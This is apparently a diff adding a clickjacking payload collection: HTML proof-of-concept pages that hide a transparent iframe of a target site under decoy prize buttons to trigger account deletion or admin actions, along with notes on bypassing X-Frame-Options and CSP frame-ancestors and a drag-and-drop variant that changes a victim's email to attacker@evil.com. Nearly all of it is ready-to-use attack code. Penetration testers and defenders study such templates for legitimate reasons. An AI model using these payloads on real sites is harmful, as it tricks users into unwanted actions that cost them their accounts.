@@ -1,0 +1,75 @@
+# ============================================================
+# Clickjacking — Payloads & PoC Templates
+# ============================================================
+
+# ---- Basic iframe PoC ----
+<html>
+<head><style>
+iframe {
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  opacity: 0.5;
+  z-index: 2;
+}
+button {
+  position: absolute;
+  top: 300px; left: 200px;
+  z-index: 1;
+}
+</style></head>
+<body>
+<button>Click here to win!</button>
+<iframe src="https://TARGET.COM/sensitive/action"></iframe>
+</body>
+</html>
+
+# ---- Fully Transparent iframe ----
+<html>
+<head><style>
+iframe {
+  width: 500px; height: 700px;
+  opacity: 0;
+  filter: alpha(opacity=0);
+  position: absolute;
+  top: 0; left: 0;
+  z-index: 2;
+}
+#decoy {
+  position: absolute;
+  top: 0; left: 0;
+  z-index: 1;
+}
+</style></head>
+<body>
+<div id="decoy">
+  <h2>Claim your prize!</h2>
+  <button style="position:absolute;top:300px;left:200px;">Click Me</button>
+</div>
+<iframe src="https://TARGET.COM/account/delete"></iframe>
+</body>
+</html>
+
+# ---- Frame Busting Bypass (sandbox) ----
+<iframe src="https://TARGET.COM/admin" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
+
+# ---- X-Frame-Options Bypass via Meta ----
+# If server sends: X-Frame-Options: SAMEORIGIN
+# But a subdomain is compromised:
+# https://subdomain.target.com/page.html → can iframe target.com
+
+# ---- Double iframe Bypass ----
+<iframe src="https://trusted.target.com/embed">
+  <iframe src="https://TARGET.COM/sensitive"></iframe>
+</iframe>
+
+# ---- CSP frame-ancestors Bypass (when wildcard subdomain trusted) ----
+# CSP: frame-ancestors *.target.com
+# Host xss.target.com → iframe target.com/action
+
+# ---- Drag-and-Drop Clickjacking ----
+<iframe id="droppable" src="https://TARGET.COM/email/change?newEmail=attacker@evil.com"></iframe>
+# Use HTML5 drag-and-drop to simulate interaction in hidden iframe
+
+# ---- Scroll + Click ----
+# Force victim to scroll to button position then click hidden iframe
